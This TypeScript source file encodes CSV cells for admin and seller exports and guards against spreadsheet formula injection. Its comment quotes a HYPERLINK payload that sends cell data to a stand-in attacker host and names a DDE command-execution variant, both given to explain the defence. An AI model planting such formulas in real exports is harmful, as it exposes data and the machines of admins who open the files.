/**
 * CSV cell encoding for the admin and seller exports.
 *
 * Two separate jobs, and the second is the one that keeps getting missed.
 *
 * 1. QUOTING, so a comma, quote or newline inside a value doesn't shift every
 *    column after it. That part the exports already did.
 *
 * 2. FORMULA NEUTRALISATION. Excel, LibreOffice Calc and Google Sheets all
 *    evaluate a cell whose text begins with `=`, `+`, `-` or `@` as a formula —
 *    and quoting does NOT stop them, because the quotes are consumed by the CSV
 *    parser before the spreadsheet ever looks at the text. Every value in these
 *    exports is attacker-supplied: a buyer types their own `full_name` and
 *    `city`, a seller names their own boutique and products. So
 *
 *        full_name = =HYPERLINK("https://evil.example/?x="&A1,"Payroll")
 *
 *    ships an exfiltration link into the file, and the `=cmd|'/c …'!A0` DDE
 *    variant reaches further than that — executing on the machine of whoever
 *    opens the export, which by definition is an admin.
 *
 * The fix is to prefix a leading apostrophe, which spreadsheets read as "treat
 * the rest as literal text" and strip on display. Tab and carriage return are
 * included because both are treated as leading whitespace and skipped, so
 * `\t=1+1` is still a formula.
 *
 * Use `csvCell` for every field of every export. There is no "this column is
 * safe" case worth remembering — a numeric column today becomes a free-text one
 * later, and the cost here is one character.
 */

const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** Quote and formula-neutralise one CSV field. */
export function csvCell(value: unknown): string {
  const text = String(value ?? '');
  const safe = FORMULA_LEAD.test(text) ? `'${text}` : text;
  return `"${safe.replace(/"/g, '""')}"`;
}

/** Join header + rows into a CSV document, encoding every cell. */
export function csvDocument(header: readonly string[], rows: readonly (readonly unknown[])[]): string {
  return [header, ...rows].map((row) => row.map(csvCell).join(',')).join('\r\n');
}
